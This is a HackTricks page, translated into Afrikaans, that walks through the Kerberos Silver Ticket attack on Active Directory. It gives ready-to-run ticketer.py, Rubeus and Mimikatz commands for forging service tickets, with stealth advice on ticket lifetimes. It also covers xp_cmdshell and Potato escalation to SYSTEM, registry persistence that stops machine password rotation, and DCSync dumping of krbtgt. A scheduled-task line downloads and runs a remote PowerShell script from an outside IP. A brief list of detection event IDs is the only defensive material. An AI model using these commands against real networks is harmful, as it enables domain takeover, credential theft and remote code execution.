# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Die **Silver Ticket**-aanval behels die uitbuiting van dienst kaartjies in Active Directory (AD)-omgewings. Hierdie metode maak staat op die **verkryging van die NTLM-hash van ’n diensrekening**, soos ’n rekenaarrekening, om ’n Ticket Granting Service (TGS)-kaartjie te vervals. Met hierdie vervalste kaartjie kan ’n aanvaller toegang tot spesifieke dienste op die netwerk verkry en **enige gebruiker naboots**, gewoonlik met die doel om administrateurvoorregte te verkry. Daar word beklemtoon dat die gebruik van AES-sleutels om kaartjies te vervals veiliger is en minder maklik opgespoor word.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets is moeiliker om op te spoor as Golden Tickets omdat hulle slegs die **hash van die diensrekening** vereis, nie die krbtgt-rekening nie. Hulle is egter beperk tot die spesifieke diens waarop hulle gemik is. Boonop, deur bloot ’n gebruiker se wagwoord te steel.
Boonop, as jy die wagwoord van ’n **rekening met ’n SPN** in die hande kry, kan jy daardie wagwoord gebruik om ’n Silver Ticket te skep wat enige gebruiker vir daardie diens naboots.

### Moderne Kerberos-veranderinge (domeine wat slegs AES gebruik)

- Windows-opdaterings vanaf **8 Nov 2022 (KB5021131)** stel dienstkaartjies by verstek op AES-sessiesleutels wanneer moontlik, en faseer RC4 uit. Daar word verwag dat DC’s teen middel 2026 by verstek **RC4 gedeaktiveer** sal hê, dus misluk die gebruik van NTLM/RC4-hashes vir Silver Tickets al hoe meer met `KRB_AP_ERR_MODIFIED`. Onttrek altyd **AES-sleutels** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) vir die teikendiensrekening.<sup>[[5]](#references)</sup>
- As die diensrekening se `msDS-SupportedEncryptionTypes` tot AES beperk is, moet jy met `/aes256` of `-aesKey` vervals; RC4 (`/rc4` of `-nthash`) sal nie werk nie, selfs al het jy die NTLM-hash.<sup>[[6]](#references)</sup>
- gMSA-/rekenaarrekeninge roteer elke 30 dae; dump die **huidige AES-sleutel** vanaf LSASS, Secretsdump/NTDS of DCsync voordat jy vervals.
- OPSEC: die verstekkaartjieleeftyd in nutsgoed is dikwels **10 jaar**; stel realistiese tydsduur (bv. `-duration 600` minute) om opsporing weens abnormale leeftye te vermy.<sup>[[6]](#references)</sup>

Vir die skep van kaartjies word verskillende nutsgoed gebruik, afhangend van die bedryfstelsel:

### Op Linux

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Op Windows

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

Die CIFS-diens word uitgelig as ’n algemene teiken om toegang tot die slagoffer se lêerstelsel te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-navrae.

### Voorbeeld: MSSQL-diens (MSSQLSvc) + Potato na SYSTEM

As jy die NTLM-hash (of AES-sleutel) het vir die rekening wat ’n **geregistreerde, presiese SQL-diens-SPN** besit, kan daardie diens ’n vervalste diensticket aanvaar. Die diensklas en gasheernaam in die ticket moet met die werklike SPN ooreenstem; moenie aanvaar dat elke installasie `MSSQLSvc/` gebruik nie. Die beweerde identiteit moet ook aan ’n SQL-aanmelding gekoppel wees met die nodige toestemmings om `xp_cmdshell` te aktiveer en uit te voer. Suksesvolle `xp_cmdshell`-opdragte loop onder die SQL-diensproses se identiteit (of ’n gekonfigureerde proxy vir bellers wat nie sysadmin is nie). Gaan daardie **proses-token** na vir geaktiveerde `SeImpersonatePrivilege` voordat jy ’n afsonderlike Potato-roete oorweeg; ’n dienskonfigurasie of SPN alleen bewys dit nie.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- As die resulterende konteks SeImpersonatePrivilege het (dikwels die geval vir diensrekeninge), gebruik ’n Potato-variant om SYSTEM te kry:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Meer besonderhede oor die misbruik van MSSQL en die aktivering van xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Oorsig van Potato-tegnieke:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Beskikbare dienste

| Dienssoort                               | Silver Tickets vir dienste                                                  |
| ---------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                      | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                      | <p>HOST</p><p>HTTP</p><p>Afhangend van die OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                    | <p>HOST</p><p>HTTP</p><p>Soms kan jy net vra vir: WINRM</p> |
| Geskeduleerde take                       | HOST                                                                       |
| Windows-lêerdeling, ook psexec           | CIFS                                                                       |
| LDAP-bewerkings, insluitend DCSync       | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                           | krbtgt                                                                     |

Met **Rubeus** kan jy al hierdie tickets aanvra met die parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver Tickets-gebeurtenis-ID's

- 4624: Aantekening van rekening
- 4634: Afmelding van rekening
- 4672: Admin-aanmelding
- **Geen voorafgaande 4768/4769 op die DC** vir dieselfde kliënt/diens is 'n algemene aanduiding dat 'n vervalste TGS direk aan die diens aangebied word.
- 'n Buitengewoon lang ticket-leeftyd of onverwagte enkripsietipe (RC4 wanneer die domein AES afdwing) val ook op in 4769/4624-data.

## Volharding

Om te verhoed dat masjiene hul wagwoord elke 30 dae verander, stel `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` of stel `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` op 'n waarde groter as 30 dae om die rotasietydperk aan te dui waarteen die masjien se wagwoord verander moet word.<sup>[[3]](#references)</sup>

## Misbruik van Service tickets

In die volgende voorbeelde, kom ons neem aan dat die ticket verkry is deur die administrateurrekening na te boots.

### CIFS

Met hierdie ticket sal jy toegang tot die `C$`- en `ADMIN$`-vouers kan kry via **SMB** (indien hulle blootgestel is) en lêers na 'n deel van die afgeleë lêerstelsel kan kopieer deur iets soos die volgende te doen:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

Jy sal ook ’n shell binne die host kan kry of arbitrêre opdragte kan uitvoer met **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Met hierdie toestemming kan jy geskeduleerde take op afgeleë rekenaars skep en arbitrêre opdragte uitvoer:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Met hierdie tickets kan jy **WMI op die slagofferstelsel uitvoer**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Vind **meer inligting oor wmiexec** op die volgende bladsy:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### GASHEER + WSMAN (WINRM)

Met WinRM-toegang tot ’n rekenaar kan jy **toegang daartoe verkry** en selfs ’n PowerShell kry:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Gaan die volgende bladsy na om **meer maniere te leer om met winrm aan ’n afgeleë gasheer te koppel**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Let daarop dat **winrm aktief moet wees en moet luister** op die afgeleë rekenaar om toegang daartoe te verkry.

### LDAP

Met hierdie voorreg kan jy die DC-databasis met **DCSync** dump:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Kom meer te wete oor DCSync** op die volgende bladsy:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Hoe om Kerberos aan te val? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Masjienrekeningwagwoordproses - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato-pad](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos-verharding en RC4-veroudering](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py huidige opsies (AES/keytab/duur)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
